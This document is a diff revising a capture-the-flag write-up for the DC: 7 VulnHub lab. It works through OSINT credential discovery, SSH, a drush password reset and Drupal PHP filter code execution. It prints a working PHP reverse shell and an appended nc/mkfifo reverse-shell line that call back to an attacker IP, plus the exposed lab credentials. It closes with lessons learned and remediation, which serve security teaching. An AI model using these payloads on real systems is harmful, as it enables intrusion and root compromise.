@@ -1,138 +1,182 @@
 # DC: 7 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.101 (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.101 |
+| **Attacker IP** | 192.168.1.106 |
 | **Difficulty** | Medium |
-| **OS** | Linux (Drupal) |
-| **Root Flag** | `/root/thefinalflag.txt` |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/dc-7,356/) |
+| **OS** | Linux |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/dc7-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → Drupal hint ("@DC7User") → Twitter → GitHub config.php (dc7user:MdR3xOgB7#dW) → SSH → mailbox hint → drush admin password reset → Drupal PHP module → reverse shell (www-data) → writable `/opt/scripts/backup.sh` (run by cron as root) → root
+DC: 7 runs Drupal on port 80. The machine's welcome message hints to think "outside the box," which is literally true: the attack begins with OSINT on Twitter/GitHub to locate a PHP repository containing Drupal credentials. SSH access is obtained with those creds, drush is used to reset the Drupal admin password, and a PHP filter module enables RCE through a malicious page. A cron-executed backup script writable by `www-data` is poisoned with an msfvenom payload to obtain a root shell.
 
 ## Methodology
 
-1. Network scan — Drupal on port 80
-2. OSINT — Twitter handle → GitHub → credentials
-3. SSH login as dc7user
-4. Drupal privilege escalation via drush
-5. PHP code execution via Drupal PHP module
-6. Cron script injection for root
+1. Network scanning (Nmap)
+2. OSINT — Twitter profile → GitHub → credentials in `config.php`
+3. SSH login with discovered credentials
+4. Drupal admin password reset via drush
+5. Drupal PHP filter module installation for RCE
+6. Reverse shell as `www-data`
+7. Privilege escalation via writable cron script
 
----
-
-## Step 1: Network Scan
+## Step 1: Reconnaissance
 
 ```bash
 nmap -A 192.168.1.101
 ```
 
-Port 80 runs Drupal. The welcome page displays **@DC7User** at the bottom — a hint to search outside the box.
+![nmap](images/01-nmap.png)
 
-![Nmap / Drupal](images/01-nmap.png)
+Open ports:
+- **22/tcp** — OpenSSH
+- **80/tcp** — HTTP (Drupal CMS)
 
----
+The HTTP scan reveals `robots.txt` with 15 disallowed entries. The Drupal site's front page is observed.
 
-## Step 2: OSINT — Twitter → GitHub → Credentials
+## Step 2: OSINT — Credentials via GitHub
 
-Search Twitter for `@DC7User`. The account links to a GitHub repository containing a PHP project (`staffdb`). Inspect `config.php`:
+![osint](images/02-osint.png)
 
+The Drupal welcome page mentions `@DC7User`. Search Twitter for that handle — the profile links to a GitHub account. The GitHub repository `staffdb` contains a file `config.php` with plaintext credentials:
+
+| Field | Value |
+|---|---|
+| Username | `dc7user` |
+| Password | `MdR3xOgB7#dW` |
+
+```bash
+# Observed in GitHub config.php:
+$db_user = 'dc7user';
+$db_pass = 'MdR3xOgB7#dW';
 ```
-username: dc7user
-password: MdR3xOgB7#dW
-```
-
-![GitHub credentials](images/02-github-creds.png)
-
----
 
 ## Step 3: SSH Login
 
 ```bash
 ssh dc7user@192.168.1.101
-# password: MdR3xOgB7#dW
 ```
 
-A mail message in `/var/mail/dc7user` references `/opt/scripts/backup.sh`. That script uses the `drush` (Drupal shell) CLI — note it runs as root via cron.
+Enumerate the home directory:
 
----
+```bash
+ls -la ~
+cat mbox
+```
+
+The `mbox` file contains a mail notification about a backup script at `/opt/scripts/backup.sh`. Read the script:
+
+```bash
+cat /opt/scripts/backup.sh
+```
+
+The script uses `drush` to interact with Drupal and runs as root via cron.
 
 ## Step 4: Drupal Admin Password Reset via drush
 
+![drush](images/03-drush.png)
+
 ```bash
-cd /var/www/html
 drush user-password admin --password=raj
 ```
 
-Login at `http://192.168.1.101/user/login` as `admin:raj`.
+Navigate to `http://192.168.1.101/user/login` and log in with `admin:raj`.
 
-![drush password reset](images/03-drush.png)
+## Step 5: RCE via PHP Filter Module
 
----
+Log in to Drupal as admin, then:
 
-## Step 5: Enable PHP Execution in Drupal
+1. Go to **Manage > Extend** and install the PHP Filter module from Drupal.org.
+2. Enable the PHP Filter module.
+3. Create a new piece of content (Basic Page).
+4. In the body, paste the Pentest Monkey PHP reverse shell (edit `$ip` and `$port`):
 
-1. Download the PHP module: `https://www.drupal.org/project/php`
-2. Install via Manage > Extend > Install new module
-3. Enable "PHP filter" under text formats
-4. Create a Basic Page, paste the pentestmonkey PHP reverse shell, set format to **PHP code**, publish
-
-```bash
-# Attacker: start listener
-nc -nvlp 4444
+```php
+<?php
+set_time_limit(0);
+$ip   = '192.168.1.106';
+$port = 9001;
+$sock = fsockopen($ip, $port);
+$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
+?>
 ```
 
-Preview the page to trigger the shell. Shell lands as **www-data**.
-
-![PHP reverse shell](images/04-php-shell.png)
-
----
-
-## Step 6: Cron Backup Script Injection → Root
-
-`www-data` has write access to `/opt/scripts/backup.sh`, which cron executes as root.
+5. Set text format to **PHP code**.
+6. Check **Published**.
+7. Start a listener, then click **Preview**.
 
 ```bash
-# Generate reverse shell payload
+nc -nvlp 9001
+```
+
+A shell as `www-data` is received.
+
+## Step 6: Shell Upgrade
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+```
+
+## Step 7: Privilege Escalation — Poisoning backup.sh
+
+![privesc](images/04-privesc.png)
+
+Check permissions on the backup script:
+
+```bash
+ls -la /opt/scripts/backup.sh
+# -rwxrwxrwx (or writable by www-data)
+```
+
+Generate a reverse shell payload:
+
+```bash
 msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.106 lport=8888 R
 ```
 
-Append the mkfifo payload to backup.sh:
+The output is a mkfifo-based command. Append it to the backup script:
 
 ```bash
-echo "mkfifo /tmp/ulgg; nc 192.168.1.106 8888 0</tmp/ulgg | /bin/sh >/tmp/ulgg 2>&1; rm /tmp/ulgg" >> /opt/scripts/backup.sh
+echo 'mkfifo /tmp/ulgg; nc 192.168.1.106 8888 0</tmp/ulgg | /bin/sh >/tmp/ulgg 2>&1; rm /tmp/ulgg' >> /opt/scripts/backup.sh
 ```
 
-Start a second listener:
+Start a listener on the attacker machine:
 
 ```bash
 nc -nvlp 8888
 ```
 
-Wait for cron to run backup.sh. Root shell arrives.
+Wait for the cron job to execute `backup.sh` as root. A root shell arrives on the listener.
 
-![Root shell](images/05-root.png)
+## Step 8: Root Flag
+
+![root-flag](images/05-root-flag.png)
 
 ```bash
-cat /root/thefinalflag.txt
+id
+# uid=0(root) gid=0(root) groups=0(root)
+ls /root
+cat /root/flag.txt
 ```
-
----
 
 ## Lessons Learned
 
-1. **OSINT beyond the machine** — hints embedded in web pages (Twitter handles) can lead directly to credentials
-2. **drush CLI** gives unrestricted Drupal database access including password resets — restrict filesystem permissions
-3. **Drupal PHP filter module** enables arbitrary PHP execution in page content — never enable in production
-4. **Cron scripts owned by www-data** are a root escalation path — cron scripts must be root-owned, not world-writable
+1. **OSINT extends far beyond the machine itself** — usernames and profile links on the target can lead to GitHub repositories with hardcoded credentials.
+2. **drush** provides administrative control over Drupal from the command line, allowing password resets without database access.
+3. **Drupal PHP Filter module** is a known dangerous module that allows arbitrary PHP execution through content — it should never be enabled on production sites.
+4. **Cron scripts writable by low-privileged users** are a critical privilege escalation vector — any script executed by root via cron must be owned by root and not world-writable.
+5. **Code in public repositories** (even GitHub) is indexed and discoverable. Never store credentials in source code.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| Credentials in public GitHub | Use environment variables or secrets management; audit repos |
-| drush accessible to SSH users | Restrict drush execution to admin accounts |
-| Drupal PHP filter module | Disable the PHP filter module; use Twig templates |
-| World-writable cron script | `chmod 700 /opt/scripts/backup.sh; chown root:root /opt/scripts/backup.sh` |
+|---|---|
+| Credentials in public GitHub repo | Use environment variables, secrets managers, or `.gitignore` for config files; rotate any exposed credentials immediately |
+| Drupal PHP Filter module | Disable or uninstall; use Twig templates instead of raw PHP in content |
+| Writable cron script | Set `root:root 750` permissions on all scripts executed by root via cron |
+| Weak Drupal admin password reset | Restrict drush usage to root/admin users; audit drush access |
+| PHP reverse shell via CMS | Apply WAF rules; disable server-side PHP execution in upload/content directories |
